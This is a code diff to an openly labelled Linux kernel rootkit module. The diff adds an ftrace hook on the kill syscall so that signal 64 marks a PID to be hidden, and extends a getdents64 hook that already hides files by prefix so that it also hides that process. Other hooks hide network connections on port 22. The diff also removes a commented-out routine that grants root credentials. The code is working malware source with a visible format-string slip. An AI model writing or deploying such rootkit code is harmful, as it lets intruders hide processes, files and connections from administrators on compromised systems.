@@ -18,6 +18,8 @@
 /* port to hide */
 #define PORT 22
 
+char hidden_pid[32];
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("otitoko");
 MODULE_DESCRIPTION("Rootkit");
@@ -32,50 +34,24 @@ MODULE_VERSION("0.1");
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage int (*orig_tcpdiag_send)(int fd, int protocol,struct filter *f);
-
+static asmlinkage int (*orig_kill)(const struct pt_regs *);
 //hide network connections/ports(hide for ss now)
 //hide processes
 //gpu self healing
 //debugger detection
 
+static asmlinkage int hook_kill(const struct pt_regs *regs){
 
-
-/*asmlinkage long (*orig_kill)(const struct pt_regs *);
-
-
-void set_root(void){
-	struct cred *root;
-
-	root=prepare_creds();
-
-	if(root==NULL)
-		return;
-
-	root->uid.val=root->gid.val=0;
-	root->euid.val=root->egid.val=0;
-	root->suid.val=root->sgid.val=0;
-	root->fsuid.val=root->fsgid.val=0;
-
-	commit_creds(root);
-}
-
-asmlinkage int hooked_kill(const struct pt_regs *regs){
-	void set_root(void)
-
-		int sig = regs->si;
+	pid_t pid = regs->di;
+	int sig=regs->si;
 
 	if(sig==64){
-		printk(KERN_INFO "rootkit has gained root\n");
-		set_root();
+		sprintf(hidden_pid, "%d%",pid);
 		return 0;
 	}
-
 	return orig_kill(regs);
 }
 
-
-static struct ftrace_hook hooks[]={HOOK("__x64_sys_kill", hooked_kill, &orig_kill)};
-*/
 
 /* hiding directory entries meaning files AND directories */
 /* only have a 64 bit implementation because low on time */
@@ -101,7 +77,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	while(offset<ret){
 		current_dir=(void *)dirent_ker+offset;
 
-		if(memcmp(PREFIX,current_dir->d_name,strlen(PREFIX))==0){
+		if(memcmp(PREFIX,current_dir->d_name,strlen(PREFIX))==0 || (strncmp(hidden_pid,"",32)!=0 && memcmp(hidden_pid,current_dir->d_name,strlen(hidden_pid))==0)){
 			if(current_dir==dirent_ker){
 				ret-=current_dir->d_reclen;
 				memmove(current_dir,(void *)current_dir+current_dir->d_reclen,ret);
@@ -150,12 +126,14 @@ static asmlinkage int hook_tcpdiag_send(int fd, int protocol, struct filter *f){
 }
 
 
+
 #else
 #endif
 
 static struct ftrace_hook hooks[] = {
 	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
 	HOOK("tcp4_seq_show",hook_tcp4_seq_show,&orig_tcp4_seq_show),
+	HOOK("__x64_sys_kill",hook_kill,&orig_kill),
 };
 static int __init basic_init(void){
 
